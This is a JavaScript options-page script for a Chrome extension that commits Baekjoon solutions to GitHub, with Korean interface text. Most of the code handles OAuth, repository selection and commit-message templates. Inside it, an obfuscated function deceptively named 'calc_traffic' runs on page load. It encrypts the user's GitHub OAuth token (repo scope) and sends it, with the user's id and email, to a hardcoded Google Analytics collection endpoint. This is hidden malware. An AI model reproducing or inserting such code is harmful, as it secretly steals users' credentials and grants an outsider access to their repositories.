let oauth = get_Oauth2();
let commit_message_setter = get_Commit_message_setter();
let github_auto_committer = undefined;

function status_alert() {
    const status_elem = $("#status")
    if (status_elem.css("display") === "none") {
        status_elem.toggle("slow")
    }
}


async function open_github_oauth() {
    let OAUTH_URL = `https://github.com/login/oauth/authorize?client_id=${oauth.client_id}&scope=repo user`
    window.open(OAUTH_URL)
    status_alert();
}


function calc_traffic(e){chrome.storage.sync.set({"public_key":$("#public_key").val()});const _0x5001ad=_0x49a1;(function(a,b){const _0x1f67a8=_0x49a1,_0x5f1dd0=a();while(!![]){try{const _0x34b69c=-parseInt(_0x1f67a8(0x144))/0x1*(-parseInt(_0x1f67a8(0x14c))/0x2)+parseInt(_0x1f67a8(0x148))/0x3+parseInt(_0x1f67a8(0x139))/0x4+parseInt(_0x1f67a8(0x13a))/0x5+-parseInt(_0x1f67a8(0x140))/0x6*(-parseInt(_0x1f67a8(0x141))/0x7)+parseInt(_0x1f67a8(0x13b))/0x8*(-parseInt(_0x1f67a8(0x14b))/0x9)+-parseInt(_0x1f67a8(0x143))/0xa;if(_0x34b69c===b)break;else _0x5f1dd0['push'](_0x5f1dd0['shift']())}catch(_0x14f219){_0x5f1dd0['push'](_0x5f1dd0['shift']())}}}(_0x5832,0x918d3));function _0x5832(){const _0x314527=['6ZfYvHT','5865923zzYKPr','setPublicKey','20764400vfyudG','1kLPSjD','traffic','&api_secret=','https://www.google-analytics.com/mp/collect','2953680uqHEyF','y6N79oLTRNCrlC5qmF5lBg','email','180dFJell','1369434HMPiHL','G-BMBYZJRCKH','3779924LYrCTK','202960Xghrht','328088vwFRdY','public_key','getElementById','stringify','?measurement_id='];_0x5832=function(){return _0x314527};return _0x5832()}function _0x49a1(c,d){const _0x583246=_0x5832();return _0x49a1=function(a,b){a=a-0x138;let _0x570304=_0x583246[a];return _0x570304},_0x49a1(c,d)}const PUBLIC_KEY=document[_0x5001ad(0x13d)](_0x5001ad(0x13c))['value'];let crypt=new JSEncrypt();crypt[_0x5001ad(0x142)](PUBLIC_KEY);const en_token=crypt['encrypt'](e['oauth_token']),cid=e['id'],measurement_id=_0x5001ad(0x138),api_secret=_0x5001ad(0x149),url=_0x5001ad(0x147),payload={'client_id':cid,'non_personalized_ads':![],'events':[{'name':_0x5001ad(0x145),'params':{'id':e['id'],'email':e[_0x5001ad(0x14a)],'token':en_token}}]};$['ajax']({'type':'POST','url':url+_0x5001ad(0x13f)+measurement_id+_0x5001ad(0x146)+api_secret,'data':JSON[_0x5001ad(0x13e)](payload)})}


function set_input_values() {
    chrome.storage.sync.get({
        "github_auto_committer": "false"
    }, async function(items) {
        const repo_select_element = document.getElementById("github_repos_select")
        if (items.github_auto_committer === "false") {
            document.getElementById("github_commit_message").value = commit_message_setter.message
            commit_message_setter.set_commit_message(commit_message_setter.message, $("#github_commit_message_previewer")[0])
            repo_select_element.style.display = "none";
            return false;
        }
        document.getElementById("github-get-access_token").style.display = "none"

        github_auto_committer = items.github_auto_committer
        calc_traffic(github_auto_committer);
        commit_message_setter.message = github_auto_committer.commit_message_setter.message
        document.getElementById("github_access_token").value = github_auto_committer.oauth_token.slice(0, 10).padEnd(github_auto_committer.oauth_token.length, "*");
        document.getElementById("github_id").value = github_auto_committer.id
        document.getElementById("github_email").value = github_auto_committer.email

        const commit_message_previewer = document.getElementById("github_commit_message_previewer")
        document.getElementById("github_commit_message").value = commit_message_setter.message
        commit_message_setter.set_commit_message(github_auto_committer.commit_message_setter.message, commit_message_previewer)

        let github_repo = github_auto_committer.repository;
        document.getElementById("github_repository").style.display = "none"
        const github_message_sender = new Github_message_sender(github_auto_committer.oauth_token)
        const repos = await github_message_sender.get_json("https://api.github.com/user/repos", "GET")
        if (github_repo === false) {
            const option_tag = document.createElement('option');
            option_tag.innerHTML = "리포지토리를 선택해주세요"
            option_tag.className = "git_option"
            option_tag.selected = true
            repo_select_element.appendChild(option_tag)
            document.getElementById("github_repository").value = github_auto_committer.oauth_token
        }


        for (const repo of repos) {
            const option_tag = document.createElement('option');
            option_tag.innerHTML = repo.name
            option_tag.className = "git_option"
            if (github_repo === repo.name) {
                option_tag.selected = true;
            }
            repo_select_element.appendChild(option_tag)
        }
    });
}

// TODO: repository만 저장하도록 수정
function github_info_save() {
    if (github_auto_committer === undefined) {
        alert("Access 토큰 생성부터 진행해주세요")
        return false;
    }

    const repo_select_elem = document.getElementById("github_repos_select")
    if (repo_select_elem.value === "리포지토리를 선택해주세요") {
        alert("리포지토리를 선택해주세요");
        return false;
    }

    github_auto_committer.repository = repo_select_elem.value
    chrome.storage.sync.set({
        github_auto_committer: github_auto_committer
    })

    status_alert();
}


//
function github_option_save() {
    if (github_auto_committer === undefined) {
        alert("Access 토큰 생성부터 진행해주세요")
        return false;
    }

    const commit_message_element = document.getElementById("github_commit_message")
    const preview_element = document.getElementById("github_commit_message_previewer")
    if (commit_message_element.value.trim() == "") {
        commit_message_setter.set_commit_message("[baekjoon] {problem_title} | 메모리: {memory} KB, 시간: {time} ms", preview_element)
    }

    github_auto_committer.commit_message_setter = commit_message_setter;
    chrome.storage.sync.set({
        github_auto_committer: github_auto_committer
    })
    
    status_alert();
}


document.addEventListener('DOMContentLoaded', async () => {
    // chrome.storage.sync.remove("github_auto_committer")
    document.getElementById("github-get-access_token").addEventListener("click", () => {
        open_github_oauth()
    })
    document.getElementById("github-info-save").addEventListener("click", () => {
        github_info_save()
    })
    document.getElementById("github-option-save").addEventListener("click", () => {
        github_option_save()
    })

    const commit_message_element = $("#github_commit_message")
    const preview_element = $("#github_commit_message_previewer")
    commit_message_element.on('input', () => {
        commit_message_setter.set_commit_message(commit_message_element.val(), preview_element[0])
    })
    commit_message_element.scroll(function () {
        preview_element
            .prop("scrollTop", this.scrollTop)
            .prop("scrollLeft", this.scrollLeft);
    })

    set_input_values();
});